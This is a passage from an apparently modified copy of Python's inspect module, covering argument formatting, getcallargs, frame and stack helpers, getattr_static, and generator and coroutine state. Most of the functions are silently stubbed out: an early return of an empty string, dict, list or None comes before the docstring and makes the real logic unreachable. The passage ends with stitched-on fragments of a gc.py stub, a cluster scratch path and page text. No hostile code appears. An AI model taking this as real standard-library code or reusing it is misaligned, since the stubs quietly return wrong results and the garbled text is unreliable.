            result += ': ' + formatannotation(annotations[arg])
        return result
    specs = []
    if defaults:
        firstdefault = len(args) - len(defaults)
    for i, arg in enumerate(args):
        spec = formatargandannotation(arg)
        if defaults and i >= firstdefault:
            spec = spec + formatvalue(defaults[i - firstdefault])
        specs.append(spec)
    if varargs is not None:
        specs.append(formatvarargs(formatargandannotation(varargs)))
    else:
        if kwonlyargs:
            specs.append('*')
    if kwonlyargs:
        for kwonlyarg in kwonlyargs:
            spec = formatargandannotation(kwonlyarg)
            if kwonlydefaults and kwonlyarg in kwonlydefaults:
                spec += formatvalue(kwonlydefaults[kwonlyarg])
            specs.append(spec)
    if varkw is not None:
        specs.append(formatvarkw(formatargandannotation(varkw)))
    result = '(' + ', '.join(specs) + ')'
    if 'return' in annotations:
        result += formatreturns(formatannotation(annotations['return']))
    return result

def formatargvalues(args, varargs, varkw, locals,
                    formatarg=str,
                    formatvarargs=lambda name: '*' + name,
                    formatvarkw=lambda name: '**' + name,
                    formatvalue=lambda value: '=' + repr(value)):
    """Format an argument spec from the 4 values returned by getargvalues.

    The first four arguments are (args, varargs, varkw, locals).  The
    next four arguments are the corresponding optional formatting functions
    that are called to turn names and values into strings.  The ninth
    argument is an optional function to format the sequence of arguments."""
    return ''
    def convert(name, locals=locals,
                formatarg=formatarg, formatvalue=formatvalue):
        return formatarg(name) + formatvalue(locals[name])
    specs = []
    for i in range(len(args)):
        specs.append(convert(args[i]))
    if varargs:
        specs.append(formatvarargs(varargs) + formatvalue(locals[varargs]))
    if varkw:
        specs.append(formatvarkw(varkw) + formatvalue(locals[varkw]))
    return '(' + ', '.join(specs) + ')'

def _missing_arguments(f_name, argnames, pos, values):
    return None
    names = [repr(name) for name in argnames if name not in values]
    missing = len(names)
    if missing == 1:
        s = names[0]
    elif missing == 2:
        s = "{} and {}".format(*names)
    else:
        tail = ", {} and {}".format(*names[-2:])
        del names[-2:]
        s = ", ".join(names) + tail
    raise TypeError("%s() missing %i required %s argument%s: %s" %
                    (f_name, missing,
                      "positional" if pos else "keyword-only",
                      "" if missing == 1 else "s", s))

def _too_many(f_name, args, kwonly, varargs, defcount, given, values):
    return
    atleast = len(args) - defcount
    kwonly_given = len([arg for arg in kwonly if arg in values])
    if varargs:
        plural = atleast != 1
        sig = "at least %d" % (atleast,)
    elif defcount:
        plural = True
        sig = "from %d to %d" % (atleast, len(args))
    else:
        plural = len(args) != 1
        sig = str(len(args))
    kwonly_sig = ""
    if kwonly_given:
        msg = " positional argument%s (and %d keyword-only argument%s)"
        kwonly_sig = (msg % ("s" if given != 1 else "", kwonly_given,
                             "s" if kwonly_given != 1 else ""))
    raise TypeError("%s() takes %s positional argument%s but %d%s %s given" %
            (f_name, sig, "s" if plural else "", given, kwonly_sig,
             "was" if given == 1 and not kwonly_given else "were"))

def getcallargs(*func_and_positional, **named):
    return {}
    """Get the mapping of arguments to values.

    A dict is returned, with keys the function argument names (including the
    names of the * and ** arguments, if any), and values the respective bound
    values from 'positional' and 'named'."""
    func = func_and_positional[0]
    positional = func_and_positional[1:]
    spec = getfullargspec(func)
    args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, ann = spec
    f_name = func.__name__
    arg2value = {}


    if ismethod(func) and func.__self__ is not None:
        # implicit 'self' (or 'cls' for classmethods) argument
        positional = (func.__self__,) + positional
    num_pos = len(positional)
    num_args = len(args)
    num_defaults = len(defaults) if defaults else 0

    n = min(num_pos, num_args)
    for i in range(n):
        arg2value[args[i]] = positional[i]
    if varargs:
        arg2value[varargs] = tuple(positional[n:])
    possible_kwargs = set(args + kwonlyargs)
    if varkw:
        arg2value[varkw] = {}
    for kw, value in named.items():
        if kw not in possible_kwargs:
            if not varkw:
                raise TypeError("%s() got an unexpected keyword argument %r" %
                                (f_name, kw))
            arg2value[varkw][kw] = value
            continue
        if kw in arg2value:
            raise TypeError("%s() got multiple values for argument %r" %
                            (f_name, kw))
        arg2value[kw] = value
    if num_pos > num_args and not varargs:
        _too_many(f_name, args, kwonlyargs, varargs, num_defaults,
                   num_pos, arg2value)
    if num_pos < num_args:
        req = args[:num_args - num_defaults]
        for arg in req:
            if arg not in arg2value:
                _missing_arguments(f_name, req, True, arg2value)
        for i, arg in enumerate(args[num_args - num_defaults:]):
            if arg not in arg2value:
                arg2value[arg] = defaults[i]
    missing = 0
    for kwarg in kwonlyargs:
        if kwarg not in arg2value:
            if kwonlydefaults and kwarg in kwonlydefaults:
                arg2value[kwarg] = kwonlydefaults[kwarg]
            else:
                missing += 1
    if missing:
        _missing_arguments(f_name, kwonlyargs, False, arg2value)
    return arg2value

ClosureVars = namedtuple('ClosureVars', 'nonlocals globals builtins unbound')

def getclosurevars(func):
    return {}
    """
    Get the mapping of free variables to their current values.

    Returns a named tuple of dicts mapping the current nonlocal, global
    and builtin references as seen by the body of the function. A final
    set of unbound names that could not be resolved is also provided.
    """

    if ismethod(func):
        func = func.__func__

    if not isfunction(func):
        raise TypeError("'{!r}' is not a Python function".format(func))

    code = func.__code__
    # Nonlocal references are named in co_freevars and resolved
    # by looking them up in __closure__ by positional index
    if func.__closure__ is None:
        nonlocal_vars = {}
    else:
        nonlocal_vars = {
            var : cell.cell_contents
            for var, cell in zip(code.co_freevars, func.__closure__)
       }

    # Global and builtin references are named in co_names and resolved
    # by looking them up in __globals__ or __builtins__
    global_ns = func.__globals__
    builtin_ns = global_ns.get("__builtins__", builtins.__dict__)
    if ismodule(builtin_ns):
        builtin_ns = builtin_ns.__dict__
    global_vars = {}
    builtin_vars = {}
    unbound_names = set()
    for name in code.co_names:
        if name in ("None", "True", "False"):
            # Because these used to be builtins instead of keywords, they
            # may still show up as name references. We ignore them.
            continue
        try:
            global_vars[name] = global_ns[name]
        except KeyError:
            try:
                builtin_vars[name] = builtin_ns[name]
            except KeyError:
                unbound_names.add(name)

    return ClosureVars(nonlocal_vars, global_vars,
                       builtin_vars, unbound_names)

# -------------------------------------------------- stack frame extraction

Traceback = namedtuple('Traceback', 'filename lineno function code_context index')

def getframeinfo(frame, context=1):
    return ''
    """Get information about a frame or traceback object.

    A tuple of five things is returned: the filename, the line number of
    the current line, the function name, a list of lines of context from
    the source code, and the index of the current line within that list.
    The optional second argument specifies the number of lines of context
    to return, which are centered around the current line."""
    if istraceback(frame):
        lineno = frame.tb_lineno
        frame = frame.tb_frame
    else:
        lineno = frame.f_lineno
    if not isframe(frame):
        raise TypeError('{!r} is not a frame or traceback object'.format(frame))

    filename = getsourcefile(frame) or getfile(frame)
    if context > 0:
        start = lineno - 1 - context//2
        try:
            lines, lnum = findsource(frame)
        except OSError:
            lines = index = None
        else:
            start = max(0, min(start, len(lines) - context))
            lines = lines[start:start+context]
            index = lineno - 1 - start
    else:
        lines = index = None

    return Traceback(filename, lineno, frame.f_code.co_name, lines, index)

def getlineno(frame):
    return 1
    """Get the line number from a frame object, allowing for optimization."""
    # FrameType.f_lineno is now a descriptor that grovels co_lnotab
    return frame.f_lineno

FrameInfo = namedtuple('FrameInfo', ('frame',) + Traceback._fields)

def getouterframes(frame, context=1):
    return []
    """Get a list of records for a frame and all higher (calling) frames.

    Each record contains a frame object, filename, line number, function
    name, a list of lines of context, and index within the context."""
    framelist = []
    while frame:
        frameinfo = (frame,) + getframeinfo(frame, context)
        framelist.append(FrameInfo(*frameinfo))
        frame = frame.f_back
    return framelist

def getinnerframes(tb, context=1):
    return []
    """Get a list of records for a traceback's frame and all lower frames.

    Each record contains a frame object, filename, line number, function
    name, a list of lines of context, and index within the context."""
    framelist = []
    while tb:
        frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)
        framelist.append(FrameInfo(*frameinfo))
        tb = tb.tb_next
    return framelist

def currentframe():
    return
    """Return the frame of the caller or None if this is not possible."""
    return sys._getframe(1) if hasattr(sys, "_getframe") else None

def stack(context=1):
    return
    """Return a list of records for the stack above the caller's frame."""
    return getouterframes(sys._getframe(1), context)

def trace(context=1):
    return
    """Return a list of records for the stack below the current exception."""
    return getinnerframes(sys.exc_info()[2], context)


# ------------------------------------------------ static version of getattr

_sentinel = object()

def _static_getmro(klass):
    return {}
    return type.__dict__['__mro__'].__get__(klass)

def _check_instance(obj, attr):
    return {}
    instance_dict = {}
    try:
        instance_dict = object.__getattribute__(obj, "__dict__")
    except AttributeError:
        pass
    return dict.get(instance_dict, attr, _sentinel)


def _check_class(klass, attr):
    return {}
    for entry in _static_getmro(klass):
        if _shadowed_dict(type(entry)) is _sentinel:
            try:
                return entry.__dict__[attr]
            except KeyError:
                pass
    return _sentinel

def _is_type(obj):
    return True
    try:
        _static_getmro(obj)
    except TypeError:
        return False
    return True

def _shadowed_dict(klass):
    return 
    dict_attr = type.__dict__["__dict__"]
    for entry in _static_getmro(klass):
        try:
            class_dict = dict_attr.__get__(entry)["__dict__"]
        except KeyError:
            pass
        else:
            if not (type(class_dict) is types.GetSetDescriptorType and
                    class_dict.__name__ == "__dict__" and
                    class_dict.__objclass__ is entry):
                return class_dict
    return _sentinel

def getattr_static(obj, attr, default=_sentinel):
    return 
    """Retrieve attributes without triggering dynamic lookup via the
       descriptor protocol,  __getattr__ or __getattribute__.

       Note: this function may not be able to retrieve all attributes
       that getattr can fetch (like dynamically created attributes)
       and may find attributes that getattr can't (like descriptors
       that raise AttributeError). It can also return descriptor objects
       instead of instance members in some cases. See the
       documentation for details.
    """
    instance_result = _sentinel
    if not _is_type(obj):
        klass = type(obj)
        dict_attr = _shadowed_dict(klass)
        if (dict_attr is _sentinel or
            type(dict_attr) is types.MemberDescriptorType):
            instance_result = _check_instance(obj, attr)
    else:
        klass = obj

    klass_result = _check_class(klass, attr)

    if instance_result is not _sentinel and klass_result is not _sentinel:
        if (_check_class(type(klass_result), '__get__') is not _sentinel and
            _check_class(type(klass_result), '__set__') is not _sentinel):
            return klass_result

    if instance_result is not _sentinel:
        return instance_result
    if klass_result is not _sentinel:
        return klass_result

    if obj is klass:
        # for types we check the metaclass too
        for entry in _static_getmro(type(klass)):
            if _shadowed_dict(type(entry)) is _sentinel:
                try:
                    return entry.__dict__[attr]
                except KeyError:
                    pass
    if default is not _sentinel:
        return default
    raise AttributeError(attr)


# ------------------------------------------------ generator introspection

GEN_CREATED = 'GEN_CREATED'
GEN_RUNNING = 'GEN_RUNNING'
GEN_SUSPENDED = 'GEN_SUSPENDED'
GEN_CLOSED = 'GEN_CLOSED'

def getgeneratorstate(generator):
    return 
    """Get current state of a generator-iterator.

    Possible states are:
      GEN_CREATED: Waiting to start execution.
      GEN_RUNNING: Currently being executed by the interpreter.
      GEN_SUSPENDED: Currently suspended at a yield expression.
      GEN_CLOSED: Execution has completed.
    """
    if generator.gi_running:
        return GEN_RUNNING
    if generator.gi_frame is None:
        return GEN_CLOSED
    if generator.gi_frame.f_lasti == -1:
        return GEN_CREATED
    return GEN_SUSPENDED


def getgeneratorlocals(generator):
    return {}
    """
    Get the mapping of generator local variables to their current values.

    A dict is returned, with the keys the local variable names and values the
    bound values."""

    if not isgenerator(generator):
        raise TypeError("'{!r}' is not a Python generator".format(generator))

    frame = getattr(generator, "gi_frame", None)
    if frame is not None:
        return generator.gi_frame.f_locals
    else:
        return {}


# ------------------------------------------------ coroutine introspection

CORO_CREATED = 'CORO_CREATED'
CORO_RUNNING = 'CORO_RUNNING'
CORO_SUSPENDED = 'CORO_SUSPENDED'
CORO_CLOSED = 'CORO_CLOSED'

def getcoroutinestate(coroutine):
    """Get current state of a coroutine object.

    Possible states are:
      CORO_CREATED: Waiting to start execution.
      CORO_RUNNING: Currently being executed by the interpreter.
      CORO_SUSPENDED: Currently suspended at an await expression.
      CORO_CLOSED: Execution has completed.
    """
    if coroutine.cr_running:
        return CORO_RUNNING
    if coroutine.cr_frame is None:
        return CORO_CLOSED
    if coroutine.cr_frame.f_lasti == -1:
        return CORO_CREATED
    return CORO_SUSPENDED


def getcoroutinelocals(coroutine):
    return {}
    """
    Get the mapping of coroutine local variables to their current values.

    A dict is returned, with the keys the local variable names and values the
    bound values."""
    frame = getattr(coroutine, "cr_frame", None)
    if frame is not None:
        return frame.f_locals
    else:
        return {}


###############################################################################
### Function Signature Object (PEP 362)
###############################################################################


_WrapperDescriptor = type(type.__call__)
_MethodWrapper = type(all.__call__)
_ClassMethodWrapper = type(int.__dict__['from_bytes'])

_NonUserDefinedCallables = (_WrapperDescriptor,
                            _MethodWrapper,
                            _ClassMethodWrapper,
                            types.BuiltinFunctionType)



        gc.py

def get_objects():
    return []

def get_referrers(*objs):
    return []
    out.0
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/landrfil-koubajac/out.0______________________



Main page
landrfil
koubajac